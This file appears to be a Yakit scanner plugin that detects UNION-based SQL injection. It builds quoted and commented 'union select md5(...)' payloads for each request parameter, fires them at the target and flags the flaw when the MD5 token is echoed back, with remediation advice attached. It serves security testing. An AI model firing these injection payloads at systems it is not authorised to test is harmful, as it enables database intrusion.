yakit.AutoInitYakit()

isJavaScript = rsp => {
    if poc.GetHTTPPacketContentType(rsp).Contains("javascript") {
        return true
    }
    return false
}

/* generates a calculation expression, which is generally used to detect whether forced type conversion is effective. */
generateIntCastCheckingExpr = func(i) {
    paramInt = atoi(i)~
    randInt = randn(100, 300)
    expr = f`${randInt+paramInt}-${randInt}`
    return expr
}

unionPayloads = func(checkType) {
    exprInfo = fuzz.FuzzCalcExpr()
    expr = exprInfo.expr

    token = exprInfo.result
    basicItem = expr
    if str.TrimSpace(checkType).Lower() == "md5" {
        basicItem = `md5(%v)` % expr
        token = codec.Md5(exprInfo.result)
    }

    yakit.Info("USE UnionItem: %v token: %v", basicItem, token)

    // base
    var payloads = []
    for in 3 {
        payloads.Push(sprint(basicItem))
    }

    var results = []
    for i in 16 {
        payloads.Push(basicItem)
        realPayload = "union select %v" % str.Join(payloads, ",")
        results.Push(realPayload)
    }
    return results, token
}



sqlInjectionChecking = func(https, request) {
    freq = fuzz.HTTPRequest(request, fuzz.https(https))~
    params = freq.GetCommonParams()
    url = str.ExtractURLFromHTTPRequestRaw(request, https)~.String()
    if len(params) <= 0 {
        return
    }

    yakit.Info("Prepare to perform SQL injection check on %v", url)
    info = i => {
        yakit.Info("Detection URL: %v - %v", url, i)
    }

    /* Start detection based on parameters */
    for i in params {
        paramName = i.Name()
        paramValue = freq.GetQueryValue(paramName)

        info(f`Parameter name:${paramName} Parameter value: ${paramValue}`)
        pureInt = str.MatchAllOfRegexp(paramValue, `\d+`)

        prefix = []
        suffix = [" -- ", " # "]
        if pureInt {
            prefix.Push(sprint(paramValue) + " ")
            prefix.Push(sprint(paramValue) + ")")
            prefix.Push(sprint(paramValue) + "))")
        } else {
            info("Start String detection")
            prefix.Push(sprint(paramValue) + "'")
            prefix.Push(sprint(paramValue) + "')")
            prefix.Push(sprint(paramValue) + "'))")
            prefix.Push(sprint(randstr(10)) + "'")
            prefix.Push(sprint(randstr(10)) + "')")
            prefix.Push(sprint(randstr(10)) + "'))")
        }

        payloads, token = unionPayloads("md5")
        token = sprint(token)
        info(f"Payload: ${len(payloads)} Prefix:${len(prefix)} Suffix:${len(suffix)} TOKEN is the most accurate detection of MD5 type Payload for " + sprint(token))

        /* The most accurate detection of MD5 payloads */
        var finished = false
        for p in prefix {
            for s in suffix {
                if finished {
                    info("Detected Finished")
                    return
                }

                for payload in payloads {
                    finPayload = p + payload + s
                    info(f"USE: prefix:${p} suffix:${s} payloads: ${sdump(payload)}")
                    rsp, err := i.Fuzz(finPayload).ExecFirst()
                    if err != nil {
                        info("FAILED: %v" % err)
                        continue
                    }
                    _, body = poc.Split(rsp.ResponseRaw)
                    bodyStr = string(body)
                    // println(bodyStr)
                    if bodyStr.Contains(token) {
                        info("Union Checking Token is effective. , Payload is:" + finPayload)
                        count = payload.Count(",") + 1
                        risk.NewRisk(
                            url,
                            risk.title(f"UNION SQL Injection Columns(MD5)[${count}] For: ${url}"),
                            risk.title(f"SQL injection (UNION) column number (MD5) [${count}] URL: ${url}"),
                            risk.type("sqlinjection"),
                            risk.severity("high"),
                            risk.request(rsp.RequestRaw),
                            risk.parameter(i.String()),
                            risk.response(rsp.ResponseRaw),
                            risk.payload(finPayload),
                            risk.description("Union-Based SQL injection is a common SQL injection attack technique that obtains sensitive information in the database by using the UNION operator in the query statement of the application. Attackers use the UNION operator to merge malicious SELECT queries with normal query results, thereby exfiltrating database data. This vulnerability detection method uses the md5 calculation result of the UNION Select expression as the basis for detection."),
                            risk.solution("uses parameterized query and ORM (object relational mapping) framework for input verification and filtering. The code follows the principle of least privilege"),
                            risk.details("Use UNION SELECT random Token as a test method, measure the number of echo columns and find the Token in the response result"),
                        )
                        finished = true
                        return
                    }
                }
            }
        }
    }
}

# mirrorNewWebsitePathParams Each time a new website path appears with some parameters, the parameters pass through common locations and parameter names Deduplication, the first HTTPFlow deduplication is called here. The
mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
    if isJavaScript(rsp) { return }
    sqlInjectionChecking(isHttps, req)
}